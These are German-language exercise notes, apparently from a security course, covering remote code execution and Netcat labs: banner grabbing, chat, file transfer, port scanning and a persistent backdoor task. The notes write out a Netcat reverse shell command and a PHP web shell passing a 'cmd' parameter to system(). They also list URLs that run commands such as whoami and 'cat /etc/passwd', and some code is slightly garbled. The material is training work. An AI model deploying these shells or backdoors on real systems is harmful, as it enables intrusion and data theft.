




#### Erkläre den Begriff Remote Code Execution und wie sie funktioniert in eigenen Worten.


Remote Code Execution  ist das ausführen eines Codes über remote zugriff aus der ferne .So kann ein Angreifer auf ein fremdes System oder PC ausführen  .  
  
Wie funktioniert Remote Code Execution?Ein Angreifer nutzt Sicherheitslücken , die es ihm erlauben, eigenen Code einzuschleusen und auf dem angegriffenen System auszuführen  
.Typische Ursachen für solche Lücken sind fehlerhafte Eingabeverarbeitung , schwache Authentifizierung oder falsch konfigurierte Server.  
Gelingt es dem Angreifer, seinen Code auf dem System laufen zu lassen, bestimmt er, was dieser Code tun soll – beispielsweise Programme starten, Daten verändern oder auslesen, Schadsoftware installieren eine Backdoor einrichten .




#### Welche Möglichkeiten gibt es eine RCE durchzuführen?

Dateiupload-Schwachstellen  
Injektionsangriffe  
Datenpakete maipulieren   
Server-side Request Forgery  
CVEs ausnutzen  
Datenlecks nutzen  
Zero-Day-Exploits





#### Banner-Grabbing mit Netcat

Verwende Netcat, um das Banner eines lokal laufenden Webservers (z.B. auf Port 80) abzurufen.  
  
Ziel: Zeige den HTTP-Header des Webservers.

![[Pasted image 20250715094750.png]]


#### Einfache Chatverbindung (lokal)

Starte auf Terminal 1 einen Listener und verbinde dich von Terminal 2 aus, um einen einfachen Textchat zu realisieren.

![[Pasted image 20250715095242.png]]



#### Dateiübertragung via Netcat (lokal)

  

Übertrage eine Textdatei von einem Host zum anderen.  
(Hinweis: Das wurde im Unterricht nicht explizit gezeigt.  
Tipp: Im Prinzip ist es eine Abwandlung des Textchats.)


![[Pasted image 20250715095844.png]]





#### Erkläre den Begriff Reverse Shell.


Bei einer Reverse Shell geht es darum um den zugriff und die vollständige Kontrolle über das System zu bekommen. im Prinzip bekommt man die Kontrolle über die Shell des Ziel System ,  
﻿  
﻿Im Gegensatz zu typischen Angriffen, bei denen der Angreifer versucht, sich direkt auf ein Zielsystem aufzuschalten (sogenannte "Bind Shell"), startet bei einer Reverse Shell das Zielsystem selbst die Verbindung nach außen – also aus dem internen Netzwerk des Opfers zu einem Server des Angreifers. Dies umgeht häufig Firewalls und Sicherheitsmaßnahmen, da ausgehende Verbindungen in vielen Netzwerken weniger streng kontrolliert oder blockiert werden als eingehende.  
﻿  
﻿Der Ablauf in Kurzform:  
﻿Der Angreifer richtet einen Listener auf seinem System ein, der auf eingehende Verbindungen wartet.  
﻿  
﻿Der infizierte Rechner des Opfers (nach Ausführung eines schädlichen Programms oder Skripts) stellt eine Verbindung zum Angreifer her.  
﻿  
﻿Über diese Verbindung kann der Angreifer dann Shell-Befehle an das Opfer weitergeben und deren Ausgaben empfangen.  
﻿  
﻿Beispiel: Mit Netcat lässt sich eine Reverse Shell beispielhaft so ausführen:  
﻿  
﻿Angreifer (Listener):bashnc -lvp 4444  
﻿  
﻿Opfer (Reverse Shell):bashnc 4444 -e /bin/bash


#### Reverse Shell:  
  

Nachdem der Chat und die Daateiübertragung funktionieren:  
- Erstelle eine Reverse Shell. Ein Terminal stellt das Opfer, das Andere den Angreifer dar.


![[Pasted image 20250715110601.png]]


#### Port-Scanner mit Netcat

  

Zeige, wie man mit Netscan einen schnellen Portscan durchführen kann.

![[Pasted image 20250715111033.png]]











#### Herausforderung: Einfache Backdoor mit Netcat

  

Kombiniere Netcat mit einem Cronjob oder Autostartmechanismus,  
um eine persistente Reverse Shell zu implementieren.


![[Pasted image 20250715111346.png]]

![[Pasted image 20250715111626.png]]






#### Herausforderung:  
 

Simulation eines Web Servers mit Netcat.  
  
Aufgabe:  
Benutze Netcact so, damit Anfragen auf den Port 80 (oder ein anderer freier Port, wie z.B. 8080) mit folgender Antwort quittiert werden:  
HTTP/1.1 200 OK  
Pseudo-Web Server  
 

Sinn: Auf diese Weise kannst du beliebige, offene Ports anbieten, um beispielsweise einen Honeypot zu realisieren.

![[Pasted image 20250715112015.png]]



#### Zusatzaufgabe:

  

Gestern Nachmittag haben wir zur Darstellung einer RCE ein Beispiel gesehen, in dem über die URL eines Webservers Kommandos auf der ausführenden Maschine ausgeführt werden konnten.  
  

Aufgabe:  
Baue das Szenario in deiner Testumgebung nach und zeige die Ausführung beliebiger Shell Kommandos auf der Zielrechner. ("Beliebig", unter Berücksichtigung der Rechte...)



<?php 
if (isset($_GET[          
cmd'])) { system($_GE                  
T['cmd']); } ?>


php -S localhost:8080
http://localhost/rce_example.php?cmd=ls
http://localhost/rce_example.php?cmd=whoami
http://localhost/rce_example.php?cmd=id
http://localhost/rce_example.php?cmd=uname+-a
http://localhost/rce_example.php?cmd=cat+/etc/passwd




## Ergebnisdarstellung

|Beispiel-URL|Wirkung auf dem Zielsystem|Typische Ausgabe|
|---|---|---|
|`/rce_example.php?cmd=ls`|Verzeichnisinhalt|listet Dateien auf|
|`/rce_example.php?cmd=whoami`|Aktiver Systemuser|z.B. `www-data`|
|`/rce_example.php?cmd=uname+-a`|Systeminfos|Kernel-Version usw.|
|`/rce_example.php?cmd=cat+/etc/passwd`|Inhalt einer Systemdatei|(nur falls Server-Rechte ausreichen!)|